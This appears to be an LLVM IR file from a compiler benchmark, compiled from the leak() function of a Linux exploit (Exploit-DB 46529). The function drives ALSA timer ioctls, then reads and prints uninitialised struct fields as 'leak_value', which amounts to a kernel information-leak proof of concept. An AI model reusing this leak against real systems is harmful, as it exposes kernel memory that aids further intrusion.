; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_46529.c_leak.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_46529.c_leak.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.snd_timer_tread = type { i32, i32, i32, i32, %struct.TYPE_2__ }
%struct.TYPE_2__ = type { i32, i32 }
%struct.snd_timer_select = type { i32, i32, i32, i32, %struct.TYPE_2__ }
%struct.snd_timer_params = type { i32, i32, i32, i32, %struct.TYPE_2__ }

@SNDRV_TIMER_EVENT_START = common dso_local global i32 0, align 4
@fd = common dso_local global i32 0, align 4
@SNDRV_TIMER_IOCTL_TREAD = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [40 x i8] c"SNDRV_TIMER_IOCTL_TREAD error : %d, %s\0A\00", align 1
@errno = common dso_local global i32 0, align 4
@SNDRV_TIMER_CLASS_GLOBAL = common dso_local global i32 0, align 4
@SNDRV_TIMER_SCLASS_APPLICATION = common dso_local global i32 0, align 4
@SNDRV_TIMER_IOCTL_SELECT = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [41 x i8] c"SNDRV_TIMER_IOCTL_SELECT error : %d, %s\0A\00", align 1
@SNDRV_TIMER_IOCTL_PARAMS = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [41 x i8] c"SNDRV_TIMER_IOCTL_PARAMS error : %d, %s\0A\00", align 1
@SNDRV_TIMER_IOCTL_START = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [40 x i8] c"SNDRV_TIMER_IOCTL_START error : %d, %s\0A\00", align 1
@.str.4 = private unnamed_addr constant [25 x i8] c"leak_value(event) : %lx\0A\00", align 1
@.str.5 = private unnamed_addr constant [23 x i8] c"leak_value(val) : %lx\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @leak() #0 {
  %1 = alloca %struct.snd_timer_tread, align 4
  %2 = alloca %struct.snd_timer_select, align 4
  %3 = alloca %struct.snd_timer_params, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = call i32 @memset(%struct.snd_timer_tread* %1, i32 0, i32 24)
  %9 = bitcast %struct.snd_timer_select* %2 to %struct.snd_timer_tread*
  %10 = call i32 @memset(%struct.snd_timer_tread* %9, i32 0, i32 24)
  %11 = bitcast %struct.snd_timer_params* %3 to %struct.snd_timer_tread*
  %12 = call i32 @memset(%struct.snd_timer_tread* %11, i32 0, i32 24)
  store i32 1, i32* %7, align 4
  %13 = load i32, i32* @SNDRV_TIMER_EVENT_START, align 4
  %14 = shl i32 1, %13
  %15 = getelementptr inbounds %struct.snd_timer_params, %struct.snd_timer_params* %3, i32 0, i32 0
  %16 = load i32, i32* %15, align 4
  %17 = or i32 %16, %14
  store i32 %17, i32* %15, align 4
  %18 = getelementptr inbounds %struct.snd_timer_params, %struct.snd_timer_params* %3, i32 0, i32 1
  store i32 1000000, i32* %18, align 4
  %19 = load i32, i32* @fd, align 4
  %20 = load i32, i32* @SNDRV_TIMER_IOCTL_TREAD, align 4
  %21 = call i32 (i32, i32, ...) @ioctl(i32 %19, i32 %20, i32* %7)
  store i32 %21, i32* %4, align 4
  %22 = load i32, i32* %4, align 4
  %23 = icmp ne i32 %22, 0
  br i1 %23, label %24, label %29

24:                                               ; preds = %0
  %25 = load i32, i32* @errno, align 4
  %26 = load i32, i32* @errno, align 4
  %27 = call i8* @strerror(i32 %26)
  %28 = call i32 (i8*, i32, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str, i64 0, i64 0), i32 %25, i8* %27)
  br label %85

29:                                               ; preds = %0
  %30 = load i32, i32* @SNDRV_TIMER_CLASS_GLOBAL, align 4
  %31 = getelementptr inbounds %struct.snd_timer_select, %struct.snd_timer_select* %2, i32 0, i32 4
  %32 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %31, i32 0, i32 1
  store i32 %30, i32* %32, align 4
  %33 = load i32, i32* @SNDRV_TIMER_SCLASS_APPLICATION, align 4
  %34 = getelementptr inbounds %struct.snd_timer_select, %struct.snd_timer_select* %2, i32 0, i32 4
  %35 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %34, i32 0, i32 0
  store i32 %33, i32* %35, align 4
  %36 = load i32, i32* @fd, align 4
  %37 = load i32, i32* @SNDRV_TIMER_IOCTL_SELECT, align 4
  %38 = call i32 (i32, i32, ...) @ioctl(i32 %36, i32 %37, %struct.snd_timer_select* %2)
  store i32 %38, i32* %4, align 4
  %39 = load i32, i32* %4, align 4
  %40 = icmp ne i32 %39, 0
  br i1 %40, label %41, label %46

41:                                               ; preds = %29
  %42 = load i32, i32* @errno, align 4
  %43 = load i32, i32* @errno, align 4
  %44 = call i8* @strerror(i32 %43)
  %45 = call i32 (i8*, i32, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.1, i64 0, i64 0), i32 %42, i8* %44)
  br label %85

46:                                               ; preds = %29
  %47 = load i32, i32* @fd, align 4
  %48 = load i32, i32* @SNDRV_TIMER_IOCTL_PARAMS, align 4
  %49 = call i32 (i32, i32, ...) @ioctl(i32 %47, i32 %48, %struct.snd_timer_params* %3)
  store i32 %49, i32* %4, align 4
  %50 = load i32, i32* %4, align 4
  %51 = icmp ne i32 %50, 0
  br i1 %51, label %52, label %57

52:                                               ; preds = %46
  %53 = load i32, i32* @errno, align 4
  %54 = load i32, i32* @errno, align 4
  %55 = call i8* @strerror(i32 %54)
  %56 = call i32 (i8*, i32, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.2, i64 0, i64 0), i32 %53, i8* %55)
  br label %85

57:                                               ; preds = %46
  %58 = load i32, i32* @fd, align 4
  %59 = load i32, i32* @SNDRV_TIMER_IOCTL_START, align 4
  %60 = call i32 (i32, i32, ...) @ioctl(i32 %58, i32 %59)
  store i32 %60, i32* %4, align 4
  %61 = load i32, i32* %4, align 4
  %62 = icmp ne i32 %61, 0
  br i1 %62, label %63, label %68

63:                                               ; preds = %57
  %64 = load i32, i32* @errno, align 4
  %65 = load i32, i32* @errno, align 4
  %66 = call i8* @strerror(i32 %65)
  %67 = call i32 (i8*, i32, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.3, i64 0, i64 0), i32 %64, i8* %66)
  br label %85

68:                                               ; preds = %57
  %69 = load i32, i32* @fd, align 4
  %70 = call i32 @read(i32 %69, %struct.snd_timer_tread* %1, i32 24)
  store i32 %70, i32* %4, align 4
  %71 = getelementptr inbounds %struct.snd_timer_tread, %struct.snd_timer_tread* %1, i32 0, i32 3
  %72 = getelementptr inbounds i32, i32* %71, i64 1
  %73 = bitcast i32* %72 to i64*
  %74 = load i64, i64* %73, align 8
  %75 = trunc i64 %74 to i32
  store i32 %75, i32* %5, align 4
  %76 = load i32, i32* %5, align 4
  %77 = call i32 (i8*, i32, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.4, i64 0, i64 0), i32 %76)
  %78 = getelementptr inbounds %struct.snd_timer_tread, %struct.snd_timer_tread* %1, i32 0, i32 2
  %79 = getelementptr inbounds i32, i32* %78, i64 1
  %80 = bitcast i32* %79 to i64*
  %81 = load i64, i64* %80, align 8
  %82 = trunc i64 %81 to i32
  store i32 %82, i32* %6, align 4
  %83 = load i32, i32* %6, align 4
  %84 = call i32 (i8*, i32, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.5, i64 0, i64 0), i32 %83)
  br label %85

85:                                               ; preds = %68, %63, %52, %41, %24
  ret void
}

declare dso_local i32 @memset(%struct.snd_timer_tread*, i32, i32) #1

declare dso_local i32 @ioctl(i32, i32, ...) #1

declare dso_local i32 @printf(i8*, i32, ...) #1

declare dso_local i8* @strerror(i32) #1

declare dso_local i32 @read(i32, %struct.snd_timer_tread*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
